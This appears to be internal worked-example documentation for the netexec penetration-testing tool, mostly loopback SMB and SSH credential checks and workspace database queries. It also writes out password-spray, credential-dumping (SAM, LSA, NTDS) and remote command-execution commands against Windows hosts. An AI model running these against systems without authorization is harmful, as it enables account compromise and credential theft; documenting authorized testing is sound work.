# netexec — worked examples

Every command below was run inside a throwaway copy of the agent image on
2026-09-17, against loopback only. Output is verbatim. The image used for the
final pass ships `dploot` 3.2.2 (the `dploot<4` pin), so `nxc smb` works; the
one section that documents an unpinned build is marked as such.

Conventions: `$TARGET` is an authorized host, `$WORK` is the per-engagement
directory (`/working/engagements/<name>`), `$DC` is the domain controller.

Versions: netexec `1.5.1+0.c7dc286b`, impacket
`0.14.0.dev0+20260916.40533.c38d1eeb`, dploot `3.2.2`, paramiko `5.0.0`.

---

## 0. Version and environment checks

```bash
nxc --version
nxc smb --help | head -20
nxc smb -L                       # module list
```

```
1.5.1 - Yippee-Ki-Yay - c7dc286b - 0
```

The first `nxc` run creates the home directory and initialises one database per
protocol:

```
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
...
[*] Copying default configuration file
```

Because `nxc smb --version` succeeds even on a build where SMB is broken (it
never loads the protocol module), the reliable health check is:

```bash
python3 -c "import nxc.protocols.smb.dpapi; print('smb protocol OK')"
```

## 1. SMB credential validation against a loopback server (verified)

An impacket `smbserver.py` gives a real SMB service to validate against without
touching an authorized Windows host:

```bash
mkdir -p /tmp/nxcshare && echo hi > /tmp/nxcshare/f.txt
smbserver.py -smb2support -username smbuser -password smbpass SHARE /tmp/nxcshare &
sleep 4

nxc smb 127.0.0.1 --no-progress
nxc smb 127.0.0.1 -u smbuser -p smbpass --local-auth --shares --no-progress
nxc smb 127.0.0.1 -u smbuser -p nope --local-auth --no-progress
```

```
SMB                      127.0.0.1       445    SePhCBlh         [*] ccUgQror (name:SePhCBlh) (domain:cYjoDXOl) (signing:False) (SMBv1:True)

SMB                      127.0.0.1       445    SePhCBlh         [*] ccUgQror (name:SePhCBlh) (domain:SePhCBlh) (signing:False) (SMBv1:True)
SMB                      127.0.0.1       445    SePhCBlh         [+] SePhCBlh\smbuser:smbpass
SMB                      127.0.0.1       445    SePhCBlh         [*] Enumerated shares
SMB                      127.0.0.1       445    SePhCBlh         Share           Permissions     Remark
SMB                      127.0.0.1       445    SePhCBlh         -----           -----------     ------
SMB                      127.0.0.1       445    SePhCBlh         IPC$            READ
SMB                      127.0.0.1       445    SePhCBlh         SHARE           READ,WRITE

SMB                      127.0.0.1       445    SePhCBlh         [*] ccUgQror (name:SePhCBlh) (domain:SePhCBlh) (signing:False) (SMBv1:True)
SMB                      127.0.0.1       445    SePhCBlh         [-] SePhCBlh\smbuser:nope STATUS_LOGON_FAILURE
```

The `(signing:False)` field is what `--gen-relay-list` selects on. Random
`name:`/`domain:` values come from the impacket server's generated identity.

## 2. The workspace database (verified)

Every result is written to SQLite as well as stdout. There is no `sqlite3` CLI
in the image:

```bash
python3 - <<'PY'
import sqlite3
con = sqlite3.connect('/root/.nxc/workspaces/default/smb.db')
for t in ('hosts', 'users', 'shares'):
    print(t, con.execute('SELECT * FROM %s' % t).fetchall()[:4])
PY
```

```
hosts [(1, '127.0.0.1', 'SePhCBlh', 'SePhCBlh', 'ccUgQror', None, 1, 0, None, None, None)]
users [(1, 'SePhCBlh', 'smbuser', 'smbpass', 'plaintext', None)]
shares [(1, 'SePhCBlh', 1, 'SHARE', '', 1, 1)]
```

SSH rows look the same way:

```bash
python3 - <<'PY'
import sqlite3
con = sqlite3.connect('/root/.nxc/workspaces/default/ssh.db')
print(con.execute('SELECT * FROM hosts').fetchall())
print(con.execute('SELECT * FROM credentials').fetchall())
PY
# hosts: [(1, '127.0.0.1', 2223, 'SSH-2.0-paramiko_5.0.0', '')]
# creds: [(1, 'testuser', 'testpass', 'plaintext')]
```

Table inventory per protocol (verified by enumerating `sqlite_master`):

```bash
python3 - <<'PY'
import sqlite3, glob
for p in sorted(glob.glob('/root/.nxc/workspaces/default/*.db')):
    con = sqlite3.connect(p)
    tables = [r[0] for r in con.execute("SELECT name FROM sqlite_master WHERE type='table'")]
    print(p.split('/')[-1], '->', ', '.join(tables))
PY
```

```
ftp.db -> credentials, hosts, loggedin_relations, directory_listings
ldap.db -> hosts, users
mssql.db -> hosts, users, admin_relations, loggedin_relations
nfs.db -> credentials, hosts, loggedin_relations, shares
rdp.db -> hosts
smb.db -> hosts, conf_checks, groups, dpapi_secrets, dpapi_backupkey, conf_checks_results, users, admin_relations, group_relations, shares, loggedin_relations
ssh.db -> credentials, hosts, loggedin_relations, admin_relations, keys
vnc.db -> credentials, hosts
winrm.db -> hosts, users, admin_relations, loggedin_relations
wmi.db -> credentials, hosts
```

Workspace management (no `--workspace` flag exists on `nxc`):

```bash
nxcdb -gw                      # current workspace
nxcdb -cw eng-memair           # create
nxcdb -sw eng-memair           # switch
```

## 3. SSH validation and `--log` format (verified)

A minimal paramiko SSH server accepting `testuser`/`testpass` makes the SSH
protocol testable the same way:

```bash
nxc ssh 127.0.0.1 --port 2223 -u testuser -p wrongpass --no-progress
```

```
SSH                      127.0.0.1       2223   127.0.0.1        [*] SSH-2.0-paramiko_5.0.0
SSH                      127.0.0.1       2223   127.0.0.1        [-] testuser:wrongpass
```

A successful password login is followed by a post-auth `id` command. Against a
server that refuses exec channels, the console shows a traceback instead of
`[+]` — but the credential is still recorded:

```
[20:53:13] ERROR    Channel closed.                                   ssh.py:136
                    ╭────── Traceback (most recent call last) ──────╮
                    │ /opt/venvs/netexec/lib/python3.11/site-packages/nx │
                    │ c/protocols/ssh.py:119 in plaintext_login     │
```

```bash
nxc ssh 127.0.0.1 --port 2223 -u testuser -p testpass --no-progress \
  --log "$WORK/loot/nxc/ssh-validate.log"
```

```
[2026-09-17 20:53:26]> /opt/venvs/netexec/bin/nxc ssh 127.0.0.1 --port 2223 -u testuser -p testpass --no-progress --log /tmp/nxw/nxc2.log

2026-09-17 20:53:27 | ssh.py:60 - INFO - SSH                      127.0.0.1       2223   127.0.0.1        [*] SSH-2.0-paramiko_5.0.0
2026-09-17 20:53:27 | ssh.py:136 - ERROR - Channel closed.
Traceback (most recent call last):
  File "/opt/venvs/netexec/lib/python3.11/site-packages/nxc/protocols/ssh.py", line 119, in plaintext_login
    self.check_shell(cred_id)
...
```

The header line records the exact command that produced the log, which makes
the artifact self-documenting. Grep results with:

```bash
grep -E '\[\+\]|\[-\]|\[\*\]' "$WORK/loot/nxc/ssh-validate.log"
```

## 4. Password spray shape (against authorized targets)

```bash
nxc smb "$WORK/targets.txt" -u "$WORK/users.txt" -p 'Spring2026!' \
  --no-bruteforce --continue-on-success -t 2 --jitter 10 \
  --ufail-limit 1 --gfail-limit 10 --fail-limit 5 \
  --log "$WORK/loot/nxc/spray.log"
```

- `-p` single value + `-u` list = one password per user (a spray).
- `--no-bruteforce` is what stops `-u file -p file` becoming a full matrix.
- `--continue-on-success` keeps going after the first hit so you learn where
  else the credential works.
- `--ufail-limit 1` stops trying a user after one failure; `--gfail-limit` and
  `--fail-limit` cap the blast radius overall.

## 5. Credential dumping and command execution shapes

**Not executed in this session** — both need an authorized Windows host. Flags
verified from `nxc smb --help`.

```bash
nxc smb 10.0.0.20 -u alice -p 'Passw0rd!' --local-auth --sam --lsa \
  --log "$WORK/loot/nxc/dump-10.0.0.20.log"
nxc smb 10.0.0.10 -u Administrator -p 'Passw0rd!' -d CORP --ntds drsuapi

nxc smb 10.0.0.20 -u alice -p 'Passw0rd!' --local-auth -x 'whoami /all'
nxc smb 10.0.0.20 -u alice -p 'Passw0rd!' --local-auth -X 'Get-Process | Select-Object -First 5'
nxc winrm 10.0.0.20 -u alice -p 'Passw0rd!' -d CORP -x hostname
```

Dumps are also written under `/root/.nxc/logs/{sam,lsa,ntds}/`. `-x` is cmd,
`-X` is PowerShell, `--exec-method {atexec,wmiexec,smbexec,mmcexec}` picks the
transport. Equivalent impacket paths: `secretsdump.py`, `psexec.py`,
`wmiexec.py`, `atexec.py`, `smbexec.py`.

## 6. Module failure modes

On an **unpinned build** (dploot 4.x), eight modules fail to load in every
protocol:

```
[-] Failed loading module at /opt/venvs/netexec/lib/python3.11/site-packages/nxc/modules/wifi.py: No module named 'dploot.lib.smb'
[-] Failed loading module at /opt/venvs/netexec/lib/python3.11/site-packages/nxc/modules/mremoteng.py: No module named 'dploot.lib.smb'
[-] Failed loading module at /opt/venvs/netexec/lib/python3.11/site-packages/nxc/modules/dpapi_hash.py: No module named 'dploot.lib.smb'
[-] Failed loading module at /opt/venvs/netexec/lib/python3.11/site-packages/nxc/modules/mobaxterm.py: No module named 'dploot.lib.smb'
[-] Failed loading module at /opt/venvs/netexec/lib/python3.11/site-packages/nxc/modules/vnc.py: No module named 'dploot.lib.smb'
[-] Failed loading module at /opt/venvs/netexec/lib/python3.11/site-packages/nxc/modules/rdcman.py: No module named 'dploot.lib.smb'
[-] Failed loading module at /opt/venvs/netexec/lib/python3.11/site-packages/nxc/modules/firefox.py: No module named 'dploot.lib.smb'
[-] Failed loading module at /opt/venvs/netexec/lib/python3.11/site-packages/nxc/modules/wam.py: No module named 'dploot.lib.smb'
LOW PRIVILEGE MODULES
CREDENTIAL_DUMPING
[*] aws-credentials           Search for aws credentials files.

HIGH PRIVILEGE MODULES (requires admin privs)
```

On the current image (dploot 3.2.2) that count is zero:

```bash
nxc ssh -L 2>&1 | grep -c 'Failed loading module'      # 0
```

## 7. Handy one-liners

```bash
# protocol module health (does the SMB protocol actually import?)
python3 -c "import nxc.protocols.smb.dpapi; print('smb protocol OK')"

# dump every credential found so far in the default workspace, as JSON
python3 - <<'PY'
import sqlite3, json, glob
out = []
for p in sorted(glob.glob('/root/.nxc/workspaces/default/*.db')):
    con = sqlite3.connect(p)
    tables = [r[0] for r in con.execute("SELECT name FROM sqlite_master WHERE type='table'")]
    if 'credentials' in tables:
        cols = [d[0] for d in con.execute('SELECT * FROM credentials LIMIT 1').description]
        for row in con.execute('SELECT * FROM credentials'):
            out.append(dict(zip(cols, row), protocol=p.split('/')[-1]))
print(json.dumps(out, indent=2, default=str))
PY

# hosts with an admin relation recorded
python3 -c "
import sqlite3; con = sqlite3.connect('/root/.nxc/workspaces/default/smb.db')
print(con.execute('SELECT * FROM admin_relations').fetchall())"

# shares found, with permissions
python3 -c "
import sqlite3; con = sqlite3.connect('/root/.nxc/workspaces/default/smb.db')
print(con.execute('SELECT host_id, name, read, write FROM shares').fetchall())"
```
